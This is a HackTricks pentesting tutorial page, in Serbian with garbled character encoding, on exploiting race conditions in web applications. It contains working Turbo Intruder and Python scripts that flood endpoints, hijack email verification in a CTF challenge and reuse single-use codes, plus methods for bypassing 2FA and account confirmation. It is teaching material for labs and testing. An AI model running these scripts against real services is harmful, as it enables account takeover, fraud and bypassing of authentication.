# TrkaÄki uslov

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=race-condition) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

{% hint style="warning" %}
Za duboko razumevanje ove tehnike proverite originalni izveÅ¡taj na [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## UnapreÄ‘enje napada trkaÄkog uslova

Glavna prepreka u iskoriÅ¡Ä‡avanju trkaÄkih uslova je osigurati da se viÅ¡estruki zahtevi obraÄ‘uju istovremeno, sa **vrlo malom razlikom u njihovim vremenima obradeâ€”idealno, manje od 1ms**.

Ovde moÅ¾ete pronaÄ‡i neke tehnike za sinhronizaciju zahteva:

#### Napad jednim paketom HTTP/2 naspram sinhronizacije poslednjeg bajta HTTP/1.1

* **HTTP/2**: PodrÅ¾ava slanje dva zahteva preko jedne TCP veze, smanjujuÄ‡i uticaj mreÅ¾nih oscilacija. MeÄ‘utim, zbog varijacija na serverskoj strani, dva zahteva moÅ¾da nisu dovoljna za dosledan napad trkaÄkog uslova.
* **HTTP/1.1 'Sinhronizacija poslednjeg bajta'**: OmoguÄ‡ava prethodno slanje veÄ‡ine delova 20-30 zahteva, zadrÅ¾avajuÄ‡i mali fragment, koji se zatim Å¡alje zajedno, postiÅ¾uÄ‡i istovremeni dolazak na server.

**Priprema za sinhronizaciju poslednjeg bajta** ukljuÄuje:

1. Slanje zaglavlja i podataka tela bez poslednjeg bajta bez zavrÅ¡etka toka.
2. Pauziranje 100ms nakon poÄetnog slanja.
3. OnemoguÄ‡avanje TCP\_NODELAY-a radi koriÅ¡Ä‡enja Nagleovog algoritma za grupisanje finalnih okvira.
4. Pingovanje za zagrevanje veze.

Naknadno slanje zadrÅ¾anih okvira trebalo bi rezultirati njihovim dolaskom u jednom paketu, Å¡to se moÅ¾e proveriti putem Wireshark-a. Ovaj metod se ne odnosi na statiÄke datoteke, koje obiÄno nisu ukljuÄene u napade trkaÄkog uslova.

### PrilagoÄ‘avanje arhitekturi servera

Razumevanje arhitekture cilja je kljuÄno. Serveri na prednjoj strani mogu usmeravati zahteve na razliÄite naÄine, Å¡to utiÄe na vreme. Prediktivno zagrevanje serverske veze, putem nebitnih zahteva, moÅ¾e normalizovati vreme zahteva.

#### Obrada zakljuÄavanja na osnovu sesije

Okviri kao Å¡to je PHP-ov rukovalac sesijama serijski obraÄ‘uju zahteve po sesiji, potencijalno prikrivajuÄ‡i ranjivosti. KoriÅ¡Ä‡enje razliÄitih sesijskih tokena za svaki zahtev moÅ¾e zaobiÄ‡i ovaj problem.

#### PrevazilaÅ¾enje ograniÄenja brzine ili resursa

Ako zagrevanje veze nije efikasno, namerno izazivanje kaÅ¡njenja ograniÄenja brzine ili resursa veb servera putem poplave laÅ¾nih zahteva moÅ¾e olakÅ¡ati napad jednim paketom indukujuÄ‡i kaÅ¡njenje na serverskoj strani pogodno za trkaÄke uslove.

## Primeri napada

* **Tubo Intruder - Napad jednim paketom HTTP2 (1 endpoint)**: MoÅ¾ete poslati zahtev **Turbo intruder-u** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), moÅ¾ete promeniti vrednost koju Å¾elite da probate silom za **`%s`** kao u `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` a zatim izabrati **`examples/race-single-packer-attack.py`** iz padajuÄ‡eg menija:

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

Ako Ä‡ete **slati razliÄite vrednosti**, moÅ¾ete izmeniti kod sa ovim koji koristi wordlistu sa clipboard-a:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Ako web ne podrÅ¾ava HTTP2 (samo HTTP1.1), umesto `Engine.BURP2` koristite `Engine.THREADED` ili `Engine.BURP`.
{% endhint %}

* **Tubo Intruder - HTTP2 napad jednim paketom (ViÅ¡e krajnjih taÄaka)**: U sluÄaju da trebate poslati zahtev jednoj krajnjoj taÄki, a zatim viÅ¡e drugim krajnjim taÄkama kako biste pokrenuli RCE, moÅ¾ete promeniti skriptu `race-single-packet-attack.py` na neÅ¡to sliÄno:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* TakoÄ‘e je dostupno u **Repeater**-u putem nove opcije '**Slanje grupe paralelno**' u Burp Suite-u.
* Za **prekoraÄenje ograniÄenja** moÅ¾ete jednostavno dodati **isti zahtev 50 puta** u grupu.
* Za **zagrevanje veze**, moÅ¾ete **dodati** na **poÄetak grupe** neke **zahteve** ka nekom nestatiÄnom delu veb servera.
* Za **odlaganje** procesa **izmeÄ‘u** obrade **jednog zahteva i drugog** u 2 podstanja koraka, moÅ¾ete **dodati dodatne zahteve izmeÄ‘u** oba zahteva.
* Za **viÅ¡estruki** RC moÅ¾ete poÄeti slati **zahtev** koji **ide ka skrivenom stanju** a zatim **50 zahteva** odmah nakon toga koji **eksploatiÅ¡u skriveno stanje**.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **Automatizovani Python skript**: Cilj ove skripte je da promeni email korisnika dok kontinuirano proverava dok verifikacioni token novog emaila ne stigne na poslednji email (ovo je zato Å¡to je u kodu primeÄ‡en RC gde je bilo moguÄ‡e modifikovati email ali imati verifikaciju poslatu na stari email jer je promenljiva koja oznaÄava email veÄ‡ bila popunjena prvom).\
Kada se reÄ "objetivo" pronaÄ‘e u primljenim emailovima znamo da smo primili verifikacioni token promenjenog emaila i zavrÅ¡avamo napad.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)




# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Sirovi BF

Prethodno istraÅ¾ivanje je pokazalo da su koriÅ¡Ä‡eni sledeÄ‡i payload-ovi koji su pokuÅ¡avali da poÅ¡alju pakete Å¡to je brÅ¾e moguÄ‡e kako bi izazvali RC.

* **PonavljaÄ:** Pogledajte primere iz prethodnog odeljka.
* **UpadaÄ:** PoÅ¡aljite **zahtev** UpadaÄu, postavite **broj niti** na **30** unutar **Opcija menija,** izaberite kao payload **Nul payload-ove** i generiÅ¡ite **30.**
* **Turbo UpadaÄ**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Metodologija RC-a**

### PrekoraÄenje ograniÄenja / TOCTOU

Ovo je najosnovniji tip trke uslova gde se **ranjivosti** pojavljuju na mestima koja **ograniÄavaju broj puta kada moÅ¾ete izvrÅ¡iti akciju**. Na primer, koriÅ¡Ä‡enje istog koda za popust u veb prodavnici viÅ¡e puta. Veoma jednostavan primer moÅ¾e se pronaÄ‡i u [**ovom izveÅ¡taju**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ili u [**ovom bug-u**](https://hackerone.com/reports/759247)**.**

Postoji mnogo varijacija ovakvih napada, ukljuÄujuÄ‡i:

* ViÅ¡estruko iskoriÅ¡Ä‡avanje poklon kartice
* Ocena proizvoda viÅ¡e puta
* Podizanje ili prenos gotovine preko stanja na vaÅ¡em raÄunu
* Ponovno koriÅ¡Ä‡enje jedinstvenog reÅ¡enja CAPTCHA
* ZaobilaÅ¾enje ograniÄenja brzine protiv grubih sila

### **Skrivene podstvari**

IskoriÅ¡Ä‡avanje sloÅ¾enih trka uslova Äesto ukljuÄuje iskoriÅ¡Ä‡avanje kratkih prilika za interakciju sa skrivenim ili **neÅ¾eljenim podstanjima maÅ¡ine**. Evo kako pristupiti ovome:

1. **Identifikacija Potencijalnih Skrivenih Podstanja**
* PoÄnite tako Å¡to Ä‡ete odrediti krajnje taÄke koje modifikuju ili interaguju sa kritiÄnim podacima, kao Å¡to su korisniÄki profili ili procesi resetovanja lozinke. Fokusirajte se na:
* **SkladiÅ¡tenje**: Preferirajte krajnje taÄke koje manipuliÅ¡u serverom persistentnim podacima u odnosu na one koje obraÄ‘uju podatke na strani klijenta.
* **Akcija**: PotraÅ¾ite operacije koje menjaju postojeÄ‡e podatke, koje su verovatnije da Ä‡e stvoriti iskoriÅ¡Ä‡ive uslove u poreÄ‘enju sa onima koje dodaju nove podatke.
* **KljuÄanje**: UspeÅ¡ni napadi obiÄno ukljuÄuju operacije kljuÄane na isti identifikator, npr. korisniÄko ime ili token za resetovanje.
2. **Sprovedite PoÄetno Ispitivanje**
* Testirajte identifikovane krajnje taÄke sa napadima trke uslova, posmatrajuÄ‡i bilo kakve odstupanja od oÄekivanih rezultata. NeoÄekivani odgovori ili promene u ponaÅ¡anju aplikacije mogu ukazati na ranjivost.
3. **PokaÅ¾ite Ranjivost**
* SuÅ¾ite napad na minimalan broj zahteva potrebnih za iskoriÅ¡Ä‡avanje ranjivosti, Äesto samo dva. Ovaj korak moÅ¾e zahtevati viÅ¡e pokuÅ¡aja ili automatizaciju zbog preciznog vremena ukljuÄenog.

### Napadi Osetljivi na Vreme

Preciznost u vremenskom slanju zahteva moÅ¾e otkriti ranjivosti, posebno kada se koriste predvidljive metode poput vremenskih oznaka za sigurnosne tokene. Na primer, generisanje tokena za resetovanje lozinke na osnovu vremenskih oznaka moglo bi omoguÄ‡iti identiÄne tokene za istovremene zahteve.

**Za IskoriÅ¡Ä‡avanje:**

* Koristite precizno vreme, poput napada sa jednim paketom, da biste poslali istovremene zahteve za resetovanje lozinke. Identifikacija identiÄnih tokena ukazuje na ranjivost.

**Primer:**

* ZatraÅ¾ite dva tokena za resetovanje lozinke istovremeno i uporedite ih. PodudarajuÄ‡i tokeni ukazuju na greÅ¡ku u generisanju tokena.

**Proverite ovaj** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **da isprobate ovo.**

## Studije sluÄaja skrivenih podstanja

### Plati & dodaj stavku

Proverite ovaj [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) da vidite kako da **platite** u prodavnici i **dodate dodatnu** stavku koju **neÄ‡ete morati platiti**.

### Potvrdi druge e-poÅ¡te

Ideja je **verifikovati adresu e-poÅ¡te i istovremeno je promeniti u drugu** kako biste saznali da li platforma verifikuje novu promenjenu adresu.

### Promeni e-poÅ¡tu u 2 adrese zasnovano na kolaÄiÄ‡ima

Prema [**ovom istraÅ¾ivanju**](https://portswigger.net/research/smashing-the-state-machine) Gitlab je bio ranjiv na preuzimanje na ovaj naÄin jer bi mogao **poslati** token za **verifikaciju e-poÅ¡te jedne adrese na drugu e-poÅ¡tu**.

**Proverite ovaj** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **da isprobate ovo.**

### Skrivena stanja baze podataka / Bajpasovanje potvrde

Ako se koriste **2 razliÄita upisa** da se **dodaju** **informacije** unutar **baze podataka**, postoji mali deo vremena kada je **samo prvi podatak upisan** unutar baze podataka. Na primer, prilikom kreiranja korisnika **korisniÄko ime** i **lozinka** mogu biti **upisani** a zatim **token** za potvrdu novo kreiranog naloga je upisan. To znaÄi da je tokom kratkog vremena **token za potvrdu naloga null**.

Stoga, **registrovanje naloga i slanje nekoliko zahteva sa praznim tokenom** (`token=` ili `token[]=` ili bilo koja druga varijacija) da bi se odmah potvrdio nalog mogao bi omoguÄ‡iti da se **potvrdi nalog** gde ne kontroliÅ¡ete e-poÅ¡tu.

**Proverite ovaj** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **da isprobate ovo.**

### Bajpasovanje 2FA

SledeÄ‡i pseudo-kod je ranjiv na trku uslova jer u vrlo kratkom vremenu **2FA nije primenjen** dok je sesija kreirana:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 veÄna upornost

Postoji nekoliko [**OAUth provajdera**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Ovi servisi Ä‡e vam omoguÄ‡iti da kreirate aplikaciju i autentifikujete korisnike koje je provajder registrovao. Da biste to uradili, **klijent** Ä‡e morati da **dozvoli vaÅ¡oj aplikaciji** pristup nekim od njihovih podataka unutar **OAUth provajdera**.\
Dakle, do sada samo uobiÄajena prijava sa google/linkedin/github... gde vam se prikazuje stranica sa porukom: "_Aplikacija \<InsertCoolName> Å¾eli da pristupi vaÅ¡im informacijama, da li Å¾elite da to dozvolite?_"

#### TrkaÄki uslov u `authorization_code`

**Problem** se javlja kada ga **prihvatite** i automatski Å¡alje **`authorization_code`** zlonamerno aplikaciji. Zatim, ova **aplikacija zloupotrebljava TrkaÄki uslov u OAUth servisu provajdera kako bi generisala viÅ¡e od jednog AT/RT** (_Authentication Token/Refresh Token_) iz **`authorization_code`** za vaÅ¡ nalog. U osnovi, zloupotrebiÄ‡e Äinjenicu da ste dozvolili aplikaciji pristup vaÅ¡im podacima da **kreira viÅ¡e naloga**. Zatim, ako **zaustavite dozvolu aplikaciji da pristupi vaÅ¡im podacima jedan par AT/RT Ä‡e biti obrisan, ali drugi Ä‡e i dalje biti validan**.

#### TrkaÄki uslov u `Refresh Token`

Kada jednom **dobijete validan RT** moÅ¾ete pokuÅ¡ati da ga **zloupotrebite kako biste generisali viÅ¡e AT/RT** i **Äak ako korisnik otkaÅ¾e dozvole** zlonamernoj aplikaciji da pristupi njegovim podacima, **viÅ¡e RT-ova Ä‡e i dalje biti validno**.

## **RC u WebSockets**

Na [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) moÅ¾ete pronaÄ‡i PoC u Javi za slanje websocket poruka **paralelno** kako biste zloupotrebili **TrkaÄke uslove takoÄ‘e u Web Sockets**.

## Reference

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=race-condition) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
